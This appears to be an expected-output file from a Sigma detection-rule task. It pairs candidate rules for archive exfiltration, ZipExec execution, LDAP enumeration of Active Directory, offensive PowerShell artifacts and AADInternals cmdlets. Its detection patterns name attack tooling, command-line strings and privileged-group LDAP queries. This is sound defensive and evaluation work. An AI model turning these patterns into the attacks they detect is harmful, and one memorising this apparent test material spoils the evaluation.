+    condition: selection1 or selection3 or selection4
+falsepositives:
+    - Legitimate upload/download of archives
+level: medium
+
+=====================  Sigma Rule Candidates 2  =====================
+title: Potential Exfiltration of Compressed Files
+id: 0d47e3f6-357f-4534-928c-202631d065fa
+status: unsupported
+description: |
+    This rule detects potential exfiltration by looking for a few compression extensions in the uri and signs of compression in the mime type, file type, and http body
+references:
+    - https://github.com/OTRF/detection-hackathon-apt29/issues/17
+author: Greg Howell, OTR (Open Threat Research)
+date: 2020/04/05
+modified: 2023/03/24
+tags:
+    - attack.exfiltration
+    - attack.t1560.001
+    - attack.t1005
+logsource:
+    product: zeek
+    service: http
+detection:
+    selection1:
+        uri|endswith:
+         - '.7z'
+         - '.zip'
+         - '.rar'
+        mime_types|endswith: 'compressed'
+    selection3:
+        filetype|endswith: 'compressed'
+    condition: selection1 or selection3
+falsepositives:
+    - Legitimate upload/download of archives
+level: medium
+
+### Expected Sigma Rule Output 17 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: Suspicious ZipExec Execution
+id: 90dcf730-1b71-4ae7-9ffc-6fcf62bd0132
+status: test
+description: ZipExec is a Proof-of-Concept (POC) tool to wrap binary-based tools into a password-protected zip file.
+references:
+    - https://twitter.com/SBousseaden/status/1451237393017839616
+    - https://github.com/Tylous/ZipExec
+author: frack113
+date: 2021-11-07
+modified: 2022-12-25
+tags:
+    - attack.execution
+    - attack.defense-evasion
+    - attack.t1218
+    - attack.t1202
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    run:
+        CommandLine|contains|all:
+            - '/generic:Microsoft_Windows_Shell_ZipFolder:filename='
+            - '.zip'
+    delete:
+        CommandLine|contains|all:
+            - '/delete'
+            - 'Microsoft_Windows_Shell_ZipFolder:filename='
+            - '.zip'
+    condition: run or delete
+falsepositives:
+    - Unknown
+level: medium
+
+=====================  Sigma Rule Candidates 2  =====================
+title: Suspicious ZipExec Execution
+id: 90dcf730-1b71-4ae7-9ffc-6fcf62bd0132
+status: test
+description: ZipExec is a Proof-of-Concept (POC) tool to wrap binary-based tools into a password-protected zip file.
+author: frack113
+date: 2021-11-07
+modified: 2022-12-25
+tags:
+    - attack.execution
+    - attack.defense-evasion
+    - attack.t1218
+    - attack.t1202
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    run:
+        CommandLine|contains|all:
+            - '/generic:Microsoft_Windows_Shell_ZipFolder:filename='
+    delete:
+        CommandLine|contains|all:
+            - '/delete'
+            - '.zip'
+    condition: run or delete
+falsepositives:
+    - Unknown
+level: medium
+
+### Expected Sigma Rule Output 18 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: Potential Active Directory Reconnaissance/Enumeration Via LDAP
+id: 31d68132-4038-47c7-8f8e-635a39a7c174
+status: test
+description: Detects potential Active Directory enumeration via LDAP
+references:
+    - https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/hunting-for-reconnaissance-activities-using-ldap-search-filters/ba-p/824726
+author: Adeem Mawani
+date: 2021-06-22
+modified: 2024-08-27
+tags:
+    - attack.discovery
+    - attack.t1069.002
+    - attack.t1087.002
+    - attack.t1482
+logsource:
+    product: windows
+    service: ldap
+    definition: 'Requirements: Microsoft-Windows-LDAP-Client/Debug ETW logging'
+detection:
+    generic_search:
+        EventID: 30
+        SearchFilter|contains:
+            - '(groupType:1.2.840.113556.1.4.803:=2147483648)'
+            - '(groupType:1.2.840.113556.1.4.803:=2147483650)'
+    distinguished_name_enumeration:
+        EventID: 30
+        SearchFilter: '(objectclass=\*)'
+        DistinguishedName|contains:
+            - 'CN=Domain Admins'
+            - 'CN=Enterprise Admins'
+            - 'CN=Group Policy Creator Owners'
+    suspicious_flag:
+        EventID: 30
+        SearchFilter|contains:
+            - '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
+            - 'msDS-AllowedToActOnBehalfOfOtherIdentity'
+            - '(accountExpires=9223372036854775807)'
+    narrow_down_filter:
+        EventID: 30
+        SearchFilter|contains:
+            - '(domainSid=*)'
+            - '(objectSid=*)'
+    condition: (generic_search and not narrow_down_filter) or suspicious_flag or distinguished_name_enumeration
+level: medium
+
+=====================  Sigma Rule Candidates 2  =====================
+title: Potential Active Directory Reconnaissance/Enumeration Via LDAP
+id: 31d68132-4038-47c7-8f8e-635a39a7c174
+status: test
+description: Detects potential Active Directory enumeration via LDAP
+references:
+    - https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/hunting-for-reconnaissance-activities-using-ldap-search-filters/ba-p/824726
+author: Adeem Mawani
+date: 2021-06-22
+modified: 2024-08-27
+tags:
+    - attack.discovery
+    - attack.t1069.002
+    - attack.t1087.002
+    - attack.t1482
+logsource:
+    product: windows
+    service: ldap
+    definition: 'Requirements: Microsoft-Windows-LDAP-Client/Debug ETW logging'
+detection:
+    generic_search:
+        EventID: 30
+        SearchFilter|contains:
+            - '(groupType:1.2.840.113556.1.4.803:=2147483648)'
+    distinguished_name_enumeration:
+        EventID: 30
+        SearchFilter: '(objectclass=\*)'
+        DistinguishedName|contains:
+            - 'CN=Domain Admins'
+    suspicious_flag:
+        EventID: 30
+        SearchFilter|contains:
+            - '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
+    narrow_down_filter:
+        EventID: 30
+        SearchFilter|contains:
+            - '(domainSid=*)'
+    condition: (generic_search and not narrow_down_filter) or suspicious_flag or distinguished_name_enumeration
+level: medium
+
+### Expected Sigma Rule Output 19 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: Bad Opsec Powershell Code Artifacts
+id: 8d31a8ce-46b5-4dd6-bdc3-680931f1db86
+related:
+    - id: 73e733cc-1ace-3212-a107-ff2523cc9fc3
+      type: derived
+status: test
+description: |
+    focuses on trivial artifacts observed in variants of prevalent offensive ps1 payloads, including
+    Cobalt Strike Beacon, PoshC2, Powerview, Letmein, Empire, Powersploit, and other attack payloads
+    that often undergo minimal changes by attackers due to bad opsec.
+references:
+    - https://newtonpaul.com/analysing-fileless-malware-cobalt-strike-beacon/
+author: 'ok @securonix invrep_de, oscd.community'
+date: 2020-10-09
+modified: 2022-12-25
+tags:
+    - attack.execution
+    - attack.t1059.001
+logsource:
+    product: windows
+    category: ps_module
+    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b
+detection:
+    selection_4103:
+        Payload|contains:
+            - 'harmj0y'
+    condition: selection_4103
+falsepositives:
+    - 'Moderate-to-low; Despite the shorter length/lower entropy for some of these, because of high specificity, fp appears to be fairly limited in many environments.'
+level: critical
+
+=====================  Sigma Rule Candidates 2  =====================
+title: Bad Opsec Powershell Code Artifacts
+id: 8d31a8ce-46b5-4dd6-bdc3-680931f1db86
+related:
+    - id: 73e733cc-1ace-3212-a107-ff2523cc9fc3
+      type: derived
+status: test
+description: |
+    focuses on trivial artifacts observed in variants of prevalent offensive ps1 payloads, including
+    Cobalt Strike Beacon, PoshC2, Powerview, Letmein, Empire, Powersploit, and other attack payloads
+    that often undergo minimal changes by attackers due to bad opsec.
+references:
+    - https://newtonpaul.com/analysing-fileless-malware-cobalt-strike-beacon/
+author: 'ok @securonix invrep_de, oscd.community'
+date: 2020-10-09
+modified: 2022-12-25
+tags:
+    - attack.execution
+    - attack.t1059.001
+logsource:
+    product: windows
+    category: ps_module
+detection:
+    selection_4103:
+        Payload|contains|all:
+            - 'harmj0y'
+            - 'test'
+    condition: selection_4103
+falsepositives:
+    - 'Moderate-to-low; Despite the shorter length/lower entropy for some of these, because of high specificity, fp appears to be fairly limited in many environments.'
+level: critical
+
+### Expected Sigma Rule Output 20 ###
+=====================  Sigma Rule Candidates 1  =====================
+title: AADInternals PowerShell Cmdlets Execution - PsScript
+id: 91e69562-2426-42ce-a647-711b8152ced6
+related:
+    - id: c86500e9-a645-4680-98d7-f882c70c1ea3
+      type: similar
+status: test
+description: Detects ADDInternals Cmdlet execution. A tool for administering Azure AD and Office 365. Which can be abused by threat actors to attack Azure AD or Office 365.
+references:
+    - https://o365blog.com/aadinternals/
+    - https://github.com/Gerenios/AADInternals
+author: Austin Songer (@austinsonger), Nasreddine Bencherchali (Nextron Systems), Swachchhanda Shrawan Poudel (Nextron Systems)
+date: 2022-12-23
+modified: 2025-02-06
+tags:
+    - attack.execution
+    - attack.reconnaissance
+    - attack.discovery
+    - attack.credential-access
+    - attack.impact
+logsource:
+    product: windows
+    category: ps_script
+    definition: Script Block Logging must be enable
+detection:
+    selection:
+        ScriptBlockText|contains:
+            # Since most of the cmdlets use a unique enough string which is "-AADInt" we only used that portion. For a complete list please check the references linked above
+            - 'Add-AADInt'
+            - 'ConvertTo-AADInt'
+            - 'Disable-AADInt'
+            - 'Enable-AADInt'
+    condition: selection
+falsepositives:
+    - Legitimate use of the library for administrative activity
+level: high
+
+=====================  Sigma Rule Candidates 2  =====================
+title: AADInternals PowerShell Cmdlets Execution - PsScript
+id: 91e69562-2426-42ce-a647-711b8152ced6
+related:
+    - id: c86500e9-a645-4680-98d7-f882c70c1ea3
+      type: similar
+status: test
+description: Detects ADDInternals Cmdlet execution. A tool for administering Azure AD and Office 365. Which can be abused by threat actors to attack Azure AD or Office 365.
+references:
+    - https://o365blog.com/aadinternals/
+    - https://github.com/Gerenios/AADInternals
+author: Austin Songer (@austinsonger), Nasreddine Bencherchali (Nextron Systems), Swachchhanda Shrawan Poudel (Nextron Systems)
+date: 2022-12-23
+modified: 2025-02-06
+tags:
+    - attack.execution
+    - attack.reconnaissance
+    - attack.discovery
+    - attack.credential-access
+    - attack.impact
+logsource:
+    product: windows
+    category: ps_script
+detection:
+    selection:
+        ScriptBlockText|contains:
+            - 'Add-AADInt'
+            - 'Enable-AADInt'
+    condition: selection
+falsepositives:
+    - Legitimate use of the library for administrative activity
+level: high
